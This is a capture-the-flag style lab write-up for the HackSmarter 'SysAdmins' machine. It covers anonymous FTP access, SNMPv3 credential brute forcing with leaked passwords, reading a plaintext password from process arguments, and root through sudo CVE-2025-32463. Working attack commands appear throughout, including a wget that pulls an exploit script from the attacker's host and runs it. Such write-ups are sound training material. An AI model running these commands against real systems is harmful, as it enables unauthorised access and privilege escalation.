---
title: "SysAdmins @ HackSmarter Writeup"
date: 2026-08-03
categories: [HackSmarter, Linux]
tags: [snmpv3, credential-stuffing, cve-2025-32463]
image:
  path: /assets/sysadmin.png
---

**Platform:** [Hacksmarter](https://www.hacksmarter.org/)

**Lab:** [SysAdmins](https://www.hacksmarter.org/courses/050ba47e-b38f-4638-8dad-1cc54b987a5d/take)

**Difficulty: Medium**

## Objective

We have been hired to perform a penetration test against a sensitive Linux server in a client's internal network. The task is to thoroughly enumerate the machine, identify all vulnerabilities, and elevate privileges to root to demonstrate impact. We were given VPN access and nothing else.

## Enumeration

### Nmap

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             742 Jul 13 12:39 data_breach_notification.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.0.0.247
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e7:26:9a:a9:16:cb:fc:82:4b:dd:f9:85:60:86:70:8d (ECDSA)
|_  256 c8:ae:e8:56:7b:51:c5:49:8b:42:c0:dd:df:02:56:eb (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Sysadmins - System Administration Services
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Three ports came back on TCP. FTP on 21 running vsftpd 3.0.5, SSH on 22, and nginx on 80 serving a site called "Sysadmins - System Administration Services". The FTP result already had something interesting inside. Nmap flagged anonymous login as enabled and listed a file called `data_breach_notification.txt` in the FTP root.

## FTP (21)

Anonymous login is open, which means anyone can connect without credentials. I logged in and grabbed the file.

```bash
~> /hacksmarter/sysadmins ftp anonymous@10.1.168.78
Connected to 10.1.168.78.
220 (vsFTPd 3.0.5)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||48345|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             742 Jul 13 12:39 data_breach_notification.txt
226 Directory send OK.
ftp> get data_breach_notification.txt
local: data_breach_notification.txt remote: data_breach_notification.txt
229 Entering Extended Passive Mode (|||5679|)
150 Opening BINARY mode data connection for data_breach_notification.txt (742 bytes).
100% |*******************************************************************************************************************************************************|   742      894.57 KiB/s    00:00 ETA
226 Transfer complete.
742 bytes received in 00:00 (2.92 KiB/s)
ftp> exit
221 Goodbye.
```

Reading the file showed an internal breach notification from Peter, the Lead Sysadmin.
```
Hi team,

We are writing to inform you of a recent data breach that may have affected some of your information.
Last week, a threat actor accessed our systems after compromising a vulnerable web application and exfiltrated some users' passwords, along with usernames and emails.
We strongly recommend that you change your password as soon as possible if your details appear in the data leak published by the attacker at https[:]//pastebin[.]com/mqPMU1cF.
We'll continue to share updates through this channel. Please do not hesitate to reach out to us if you have any questions.
Our team is working around the clock to deal with this situation, and we really appreciate your patience and understanding.

Kind regards,
Peter
Lead Sysadmin
```

### Checking the Breached Passwords

Navigating to the Pastebin link at `https://pastebin.com/mqPMU1cF` revealed a list of plaintext passwords with no usernames attached. 

<img width="1142" height="635" alt="image" src="https://github.com/user-attachments/assets/99dd46f0-e449-4396-8343-ba8fb60851c4" />

Passwords alone are not enough, we need usernames to go with them.

## HTTP (80)

The website had a `team.html` page listing the three engineers on the team.

<img width="1375" height="692" alt="image" src="https://github.com/user-attachments/assets/a2682335-07e0-4e05-b4a3-afd7b5b59ed5" />

**Three usernames:**
```
waserby
helena
peter
```

We now have a username list and a password list. Before trying them against SSH, it was worth doing a UDP scan to check if anything else was running.

## UDP Scanning

```bash
~> /hacksmarter/sysadmins nmap 10.1.168.78 -sU --min-rate 1000  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-02 10:28 +0100
Nmap scan report for 10.1.168.78
Host is up (0.23s latency).
Not shown: 988 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
161/udp   open   snmp
```

One result: **SNMP on UDP 161**.

### Enumerating SNMP

```bash
~> /hacksmarter/sysadmins nmap -sU -p 161 -sVC --script snmp-info 10.1.168.78
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-02 11:56 +0100
Nmap scan report for 10.1.168.78
Host is up (0.25s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    net-snmp; net-snmp SNMPv3 server
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 13f3f36692d0546a00000000
|   snmpEngineBoots: 11
|_  snmpEngineTime: 2h07m47s
```

The scan confirmed it is running **SNMPv3**. This is significant. SNMPv1 and v2 use a simple community string for authentication, essentially a shared password. SNMPv3 is different because it requires an actual username and password, with support for MD5 or SHA authentication. That means the credentials we pulled from Pastebin are directly applicable here.

Rather than testing each username and password combination manually, I used `legba` to automate the brute force.

```bash
~> /hacksmarter/sysadmins legba snmp3 --target 10.1.168.78 \
  --username potential_usernames.txt \
  --password leaked_passwords.txt
```

<img width="1541" height="255" alt="image" src="https://github.com/user-attachments/assets/a70795a4-1695-45e4-b892-944533ca9da4" />

Valid credentials found:
`waserby : butterfly`

### Walking the SNMP Tree

With valid SNMPv3 credentials, I could walk the full MIB tree, essentially reading everything the SNMP agent knows about the system, including running processes and the arguments they were launched with.

```bash
~> /hacksmarter/sysadmins snmpwalk -v3 -l authNoPriv -u waserby -a MD5 -A butterfly 10.1.168.78
```

Scanning through the output, the process list section showed something unexpected. A scheduled script was running an SSH command for `helena` with the password passed as a command line argument in plaintext.

<img width="1194" height="392" alt="image" src="https://github.com/user-attachments/assets/513e7ce7-6c7b-43ad-a339-b701a0ad8bae" />


`helena : PerfectIsTheEnemyOfDone223!`

Credentials in process arguments are readable by anyone with SNMP access to the host. This is a straightforward credential exposure through a poorly configured automation script.

---

## Shell as helena

```bash
~> /hacksmarter/sysadmins ssh helena@10.1.168.78
helena@10.1.168.78's password: 

helena@sysadmins:~$ id
uid=1000(helena) gid=1000(helena) groups=1000(helena)
```

**Getting the user flag:**
```bash
helena@sysadmins:~$ cat user.txt
f47e15d6b346cb443xxxxxxxxxxxxxxx
```

---

## Privilege Escalation -- CVE-2025-32463

Standard post-exploitation checks turned up nothing immediately useful. No writable crons, no interesting sudo entries, no SUID binaries standing out. I moved on to check the sudo version.

```bash
helena@sysadmins:~$ sudo --version
Sudo version 1.9.16p2
Sudoers policy plugin version 1.9.16p2
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.16p2
Sudoers audit plugin version 1.9.16p2
helena@sysadmins:~$ 
```

Sudo 1.9.16p2 is vulnerable to **CVE-2025-32463**, a local privilege escalation that abuses sudo's `--chroot` (`-R`) flag. When sudo processes `-R` with a user-controlled directory, it loads a `nsswitch.conf` from that directory before dropping privileges. By crafting a malicious shared library and pointing sudo at a prepared directory, an attacker can execute code as root.

I grabbed the PoC from [https://github.com/kh4sh3i/CVE-2025-32463](https://github.com/kh4sh3i/CVE-2025-32463), served it locally from my machine, and downloaded it to the target.

```bash
helena@sysadmins:/tmp$ wget http://10.200.76.85:8080/exploit.sh
helena@sysadmins:/tmp$ chmod +x exploit.sh
helena@sysadmins:/tmp$ ./exploit.sh
woot!
root@sysadmins:/# id
uid=0(root) gid=0(root) groups=0(root),1000(helena)
```

**Getting the root flag:**

```bash
root@sysadmins:/root# cat root.txt
2c0ae869620220c3exxxxxxxxxxxxxxx
```

**Happy Hacking!!!!**

<img width="846" height="655" alt="image" src="https://github.com/user-attachments/assets/8ced9939-3ded-4d0c-98bf-88119c053dfb" />
